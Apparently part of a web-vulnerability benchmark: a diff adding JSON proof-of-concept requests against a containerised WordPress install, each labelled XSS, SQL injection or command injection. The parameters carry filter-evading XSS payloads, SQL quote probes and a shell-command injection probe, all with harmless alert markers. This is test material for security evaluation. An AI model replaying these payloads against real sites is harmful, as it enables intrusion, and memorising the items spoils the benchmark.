@@ -1,0 +1,3499 @@
+[
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/users.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"35a04922b1\"};"
+      ]
+    },
+    "query_params": {
+      "order": [
+        "asc"
+      ],
+      "orderby": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.681c57491ca76",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_06215c",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/options.php",
+    "post_data": {
+      "_wp_http_referer": [
+        "/wp-admin/options-discussion.php"
+      ],
+      "_wpnonce": [
+        "1f89f926a2"
+      ],
+      "action": [
+        "update"
+      ],
+      "close_comments_days_old": [
+        "123"
+      ],
+      "close_comments_for_old_posts": [
+        "1"
+      ],
+      "comment_max_links": [
+        "123"
+      ],
+      "comment_moderation": [
+        "1"
+      ],
+      "comment_order": [
+        "asc"
+      ],
+      "comment_previously_approved": [
+        "1"
+      ],
+      "comment_registration": [
+        "1"
+      ],
+      "comments_notify": [
+        "1"
+      ],
+      "comments_per_page": [
+        "123"
+      ],
+      "default_comment_status": [
+        "open"
+      ],
+      "default_comments_page": [
+        "newest"
+      ],
+      "default_ping_status": [
+        "open"
+      ],
+      "default_pingback_flag": [
+        "sqli@%27"
+      ],
+      "disallowed_keys": [
+        "xuefeng20011024"
+      ],
+      "moderation_keys": [
+        "xuefeng20011024"
+      ],
+      "moderation_notify": [
+        "1"
+      ],
+      "option_page": [
+        "discussion"
+      ],
+      "page_comments": [
+        "1"
+      ],
+      "require_name_email": [
+        "1"
+      ],
+      "show_avatars": [
+        "1"
+      ],
+      "show_comments_cookies_opt_in": [
+        "1"
+      ],
+      "submit": [
+        "Save Changes"
+      ],
+      "thread_comments": [
+        "1"
+      ],
+      "thread_comments_depth": [
+        "2"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.694163a8d30ed",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_07b802",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/edit-comments.php",
+    "post_data": {},
+    "query_params": {
+      "_ajax_fetch_list_nonce": [
+        "5aa52a1157"
+      ],
+      "_page": [
+        "1"
+      ],
+      "_per_page": [
+        "123"
+      ],
+      "_total": [
+        "1"
+      ],
+      "action": [
+        "-1"
+      ],
+      "action2": [
+        "-1"
+      ],
+      "comment_status": [
+        "all"
+      ],
+      "comment_type": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "paged": [
+        "1"
+      ],
+      "pagegen_timestamp": [
+        "2025-12-09 22:19:02"
+      ],
+      "s": [
+        "xuefeng20011024"
+      ]
+    },
+    "request_id": "requests.6941635d81ce5",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_0f12fb",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/plugin-install.php",
+    "post_data": {
+      "var _wpUpdatesSettings ": [
+        "{\"ajax_nonce\":\"41b47316dd\"};"
+      ]
+    },
+    "query_params": {
+      "TB_iframe": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "from": [
+        "import"
+      ],
+      "height": [
+        "550"
+      ],
+      "plugin": [
+        "movabletype-importer"
+      ],
+      "tab": [
+        "plugin-information"
+      ],
+      "width": [
+        "600"
+      ]
+    },
+    "request_id": "requests.681c57b2b33fd",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_13526c",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-login.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "confirm_admin_email"
+      ],
+      "redirect_to": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "wp_lang": [
+        "en_US"
+      ]
+    },
+    "request_id": "requests.6941631f0f2ed",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_19ac7d",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/users.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "<script>xss(80941049)</script>"
+      ],
+      "action2": [
+        "<script>xss(60968227)</script>"
+      ],
+      "changeit2": [
+        "Change"
+      ],
+      "new_role": [
+        "<script>xss(27874769)</script>"
+      ],
+      "new_role2": [
+        "<script>xss(3767872)</script>"
+      ],
+      "paged": [
+        "<script>xss(85677271)</script>"
+      ],
+      "s": [
+        "\""
+      ]
+    },
+    "request_id": "requests.69416364c4704",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_1afc00",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/post.php",
+    "post_data": {
+      "_wp_http_referer": [
+        "/wp-admin/index.php"
+      ],
+      "_wpnonce": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ],
+      "action": [
+        "post-quickdraft-save"
+      ],
+      "content": [
+        "sullaloe"
+      ],
+      "post_ID": [
+        "8"
+      ],
+      "post_title": [
+        "sullaloe"
+      ],
+      "post_type": [
+        "post"
+      ],
+      "save": [
+        "Save Draft"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.694163356864e",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_1b6862",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/load-scripts.php",
+    "post_data": {},
+    "query_params": {
+      "c": [
+        "0"
+      ],
+      "load[chunk_0]": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "ver": [
+        "6.6.4"
+      ]
+    },
+    "request_id": "requests.69416386c3c8d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_1c0881",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/index.php/wp-json/wp/v2/types/post",
+    "post_data": {},
+    "query_params": {
+      "context": [
+        "url(\"data:image/jpg;base64,</style><svg/onload=alert(987890)>\")"
+      ]
+    },
+    "request_id": "requests.6941638f6df9f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_1c7bdb",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-login.php",
+    "post_data": {
+      "log": [
+        "xuefeng20011024"
+      ],
+      "pwd": [
+        "url(\"data:image/jpg;base64,</style><svg/onload=alert(987890)>\")"
+      ],
+      "redirect_to": [
+        "http://10.176.36.21:50015/wp-admin/"
+      ],
+      "testcookie": [
+        "1"
+      ],
+      "wp-submit": [
+        "Log In"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.6941631ee38c0",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_22d795",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/edit-comments.php",
+    "post_data": {},
+    "query_params": {
+      "_ajax_fetch_list_nonce": [
+        "5aa52a1157"
+      ],
+      "_page": [
+        "1"
+      ],
+      "_per_page": [
+        "123"
+      ],
+      "_total": [
+        "1"
+      ],
+      "action": [
+        "-1"
+      ],
+      "action2": [
+        "-1"
+      ],
+      "comment_status": [
+        "all"
+      ],
+      "comment_type": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "paged": [
+        "1"
+      ],
+      "pagegen_timestamp": [
+        "2025-12-09 22:19:02"
+      ],
+      "s": [
+        "xuefeng20011024"
+      ]
+    },
+    "request_id": "requests.6941635d81ce5",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_28753c",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/edit.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"11edef0e22\"};"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "trash"
+      ],
+      "action2": [
+        "trash"
+      ],
+      "cat": [
+        "1"
+      ],
+      "filter_action": [
+        "Filter"
+      ],
+      "m": [
+        "0"
+      ],
+      "paged": [
+        "1"
+      ],
+      "post[0]": [
+        "1"
+      ],
+      "post_status": [
+        "all"
+      ],
+      "post_type": [
+        "post"
+      ],
+      "s": [
+        "sqli'@test.com"
+      ]
+    },
+    "request_id": "requests.681c57a7b805f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_29d4e5",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/edit.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"11edef0e22\"};"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "trash"
+      ],
+      "action2": [
+        "trash"
+      ],
+      "cat": [
+        "1"
+      ],
+      "filter_action": [
+        "Filter"
+      ],
+      "m": [
+        "0"
+      ],
+      "paged": [
+        "1"
+      ],
+      "post[0]": [
+        "1"
+      ],
+      "post_status": [
+        "all"
+      ],
+      "post_type": [
+        "post"
+      ],
+      "s": [
+        "ls '"
+      ]
+    },
+    "request_id": "requests.681c57a7b805f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_2bd0fc",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/users.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "<script>xss(80941049)</script>"
+      ],
+      "action2": [
+        "<script>xss(60968227)</script>"
+      ],
+      "changeit2": [
+        "Change"
+      ],
+      "new_role": [
+        "<script>xss(27874769)</script>"
+      ],
+      "new_role2": [
+        "<script>xss(3767872)</script>"
+      ],
+      "paged": [
+        "<script>xss(85677271)</script>"
+      ],
+      "s": [
+        "\""
+      ]
+    },
+    "request_id": "requests.69416364c4704",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_2c0eab",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/users.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"11edef0e22\"};"
+      ]
+    },
+    "query_params": {
+      "role": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.681c5790f0e72",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_2e2795",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/customize.php",
+    "post_data": {},
+    "query_params": {
+      "addnew": [
+        "1"
+      ],
+      "base": [
+        "media_gallery"
+      ],
+      "editwidget": [
+        "media_gallery-1"
+      ],
+      "id": [
+        "theme"
+      ],
+      "num": [
+        "2"
+      ],
+      "return": [
+        "/wp-admin/themes.php"
+      ],
+      "theme": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.681c5716d2b9c",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_304976",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/edit-comments.php",
+    "post_data": {},
+    "query_params": {
+      "_ajax_fetch_list_nonce": [
+        "5aa52a1157"
+      ],
+      "_page": [
+        "1"
+      ],
+      "_per_page": [
+        "123"
+      ],
+      "_total": [
+        "1"
+      ],
+      "action": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "action2": [
+        "-1"
+      ],
+      "comment_status": [
+        "all"
+      ],
+      "comment_type": [
+        ""
+      ],
+      "delete_comments[0]": [
+        "1"
+      ],
+      "paged": [
+        "1"
+      ],
+      "pagegen_timestamp": [
+        "2025-12-09 22:21:56"
+      ],
+      "s": [
+        "xuefeng20011024"
+      ]
+    },
+    "request_id": "requests.6941633b477a6",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_33e424",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/post.php",
+    "post_data": {
+      "_wp_http_referer": [
+        "/wp-admin/index.php"
+      ],
+      "_wpnonce": [
+        "6391b966cd"
+      ],
+      "action": [
+        "post-quickdraft-save"
+      ],
+      "content": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "post_ID": [
+        "8"
+      ],
+      "post_title": [
+        "sullaloe"
+      ],
+      "post_type": [
+        "post"
+      ],
+      "save": [
+        "Save Draft"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.6941633542e89",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_348460",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/profile.php",
+    "post_data": {
+      "_wp_http_referer": [
+        "/wp-admin/profile.php?wp_http_referer=%2Fwp-admin%2Fusers.php"
+      ],
+      "_wpnonce": [
+        "c5505b8779"
+      ],
+      "action": [
+        "update"
+      ],
+      "admin_bar_front": [
+        "</title></option><script>xss(62092469)</script>"
+      ],
+      "admin_color": [
+        "</title></option><script>xss(83263311)</script>"
+      ],
+      "checkuser_id": [
+        "1"
+      ],
+      "color-nonce": [
+        "a21bb6effd"
+      ],
+      "comment_shortcuts": [
+        "</title></option><script>xss(21966227)</script>"
+      ],
+      "description": [
+        "cesyeoey"
+      ],
+      "display_name": [
+        "</title></option><script>xss(59791305)</script>"
+      ],
+      "email": [
+        "</title></option><script>xss(40629044)</script>"
+      ],
+      "first_name": [
+        "cesyeoey"
+      ],
+      "from": [
+        "profile"
+      ],
+      "last_name": [
+        "cesyeoey"
+      ],
+      "nickname": [
+        "cesyeoey"
+      ],
+      "pass1": [
+        "</title></option><script>xss(21356479)</script>"
+      ],
+      "pass2": [
+        "\""
+      ],
+      "rich_editing": [
+        "</title></option><script>xss(39436639)</script>"
+      ],
+      "submit": [
+        "Update Profile"
+      ],
+      "syntax_highlighting": [
+        "</title></option><script>xss(46695540)</script>"
+      ],
+      "url": [
+        "xuefeng20011024"
+      ],
+      "user_id": [
+        "1"
+      ],
+      "user_login": [
+        "cesyeoey"
+      ],
+      "wp_http_referer": [
+        "<br />\r\n<b>Warning</b>:  main() [echo]: Attempt to echo a string that might be tainted in <b>/var/www/html/wp-admin/user-edit.php</b> on line <b>284</b><br />\r\n/wp-admin/users.php"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.694163821f493",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_3dba57",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/profile.php",
+    "post_data": {
+      "_wp_http_referer": [
+        "/wp-admin/profile.php?wp_http_referer=%2Fwp-admin%2Fusers.php"
+      ],
+      "_wpnonce": [
+        "c5505b8779"
+      ],
+      "action": [
+        "update"
+      ],
+      "admin_bar_front": [
+        "</title></option><script>xss(62092469)</script>"
+      ],
+      "admin_color": [
+        "</title></option><script>xss(83263311)</script>"
+      ],
+      "checkuser_id": [
+        "1"
+      ],
+      "color-nonce": [
+        "a21bb6effd"
+      ],
+      "comment_shortcuts": [
+        "</title></option><script>xss(21966227)</script>"
+      ],
+      "description": [
+        "cesyeoey"
+      ],
+      "display_name": [
+        "</title></option><script>xss(59791305)</script>"
+      ],
+      "email": [
+        "</title></option><script>xss(40629044)</script>"
+      ],
+      "first_name": [
+        "cesyeoey"
+      ],
+      "from": [
+        "profile"
+      ],
+      "last_name": [
+        "cesyeoey"
+      ],
+      "nickname": [
+        "cesyeoey"
+      ],
+      "pass1": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "pass2": [
+        "</title></option><script>xss(59949618)</script>"
+      ],
+      "rich_editing": [
+        "</title></option><script>xss(39436639)</script>"
+      ],
+      "submit": [
+        "Update Profile"
+      ],
+      "syntax_highlighting": [
+        "</title></option><script>xss(46695540)</script>"
+      ],
+      "url": [
+        "xuefeng20011024"
+      ],
+      "user_id": [
+        "1"
+      ],
+      "user_login": [
+        "cesyeoey"
+      ],
+      "wp_http_referer": [
+        "<br />\r\n<b>Warning</b>:  main() [echo]: Attempt to echo a string that might be tainted in <b>/var/www/html/wp-admin/user-edit.php</b> on line <b>284</b><br />\r\n/wp-admin/users.php"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.6941637fb0c5f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_474b2e",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/export.php",
+    "post_data": {},
+    "query_params": {
+      "attachment_end_date": [
+        "0"
+      ],
+      "attachment_start_date": [
+        "0"
+      ],
+      "cat": [
+        "0"
+      ],
+      "content": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "download": [
+        "true"
+      ],
+      "page_author": [
+        "0"
+      ],
+      "page_end_date": [
+        "0"
+      ],
+      "page_start_date": [
+        "0"
+      ],
+      "page_status": [
+        "0"
+      ],
+      "post_author": [
+        "0"
+      ],
+      "post_end_date": [
+        "0"
+      ],
+      "post_start_date": [
+        "0"
+      ],
+      "post_status": [
+        "0"
+      ],
+      "submit": [
+        "Download Export File"
+      ]
+    },
+    "request_id": "requests.67df051a126e7",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_5476b5",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/edit.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"11edef0e22\"};"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "trash"
+      ],
+      "action2": [
+        "trash"
+      ],
+      "cat": [
+        "1"
+      ],
+      "filter_action": [
+        "Filter"
+      ],
+      "m": [
+        "0"
+      ],
+      "paged": [
+        "1"
+      ],
+      "post[0]": [
+        "1"
+      ],
+      "post_status": [
+        "all"
+      ],
+      "post_type": [
+        "post"
+      ],
+      "s": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ]
+    },
+    "request_id": "requests.681c57a7b805f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_5a2824",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/plugins.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"ff0a484bea\"};"
+      ]
+    },
+    "query_params": {
+      "s": [
+        "default"
+      ]
+    },
+    "request_id": "requests.681c58b152a13",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_5de44e",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/plugins.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"11edef0e22\"};"
+      ]
+    },
+    "query_params": {
+      "_wpnonce": [
+        "d111d5d4e4"
+      ],
+      "action": [
+        "sqli%27"
+      ],
+      "paged": [
+        "1"
+      ],
+      "plugin": [
+        "hello.php"
+      ],
+      "plugin_status": [
+        "all"
+      ],
+      "s": [
+        ""
+      ]
+    },
+    "request_id": "requests.681c57f69afec",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_606606",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/edit-comments.php",
+    "post_data": {
+      "var wpLinkL10n ": [
+        "{\"title\":\"Insert\\/edit link\",\"update\":\"Update\",\"save\":\"Add Link\",\"noTitle\":\"(no title)\",\"noMatchesFound\":\"No results found.\",\"linkSelected\":\"Link selected.\",\"linkInserted\":\"Link inserted.\",\"minInputLength\":\"3\"};"
+      ]
+    },
+    "query_params": {
+      "ids": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "spammed": [
+        "1"
+      ]
+    },
+    "request_id": "requests.681c585906374",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_6183a8",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-cron.php",
+    "post_data": {},
+    "query_params": {
+      "doing_wp_cron": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.682c75a52823e",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_6863d2",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/update.php",
+    "post_data": {
+      "_fs_nonce": [
+        "a92e042abc"
+      ],
+      "connection_type": [
+        "ftp"
+      ],
+      "hostname": [
+        "xuefeng20011024"
+      ],
+      "password": [
+        "xuefeng20011024"
+      ],
+      "upgrade": [
+        "Proceed"
+      ],
+      "username": [
+        "xuefeng20011024"
+      ]
+    },
+    "query_params": {
+      "_wpnonce": [
+        "cd21139683"
+      ],
+      "action": [
+        "install-plugin"
+      ],
+      "plugin": [
+        "\"><svg onload=alert(987890)//"
+      ]
+    },
+    "request_id": "requests.67df053ac51f3",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_6a7d3b",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-login.php",
+    "post_data": {
+      "log": [
+        "xuefeng20011024"
+      ],
+      "pwd": [
+        "xuefeng20011024"
+      ],
+      "redirect_to": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ],
+      "testcookie": [
+        "1"
+      ],
+      "wp-submit": [
+        "Log In"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.6941631eef633",
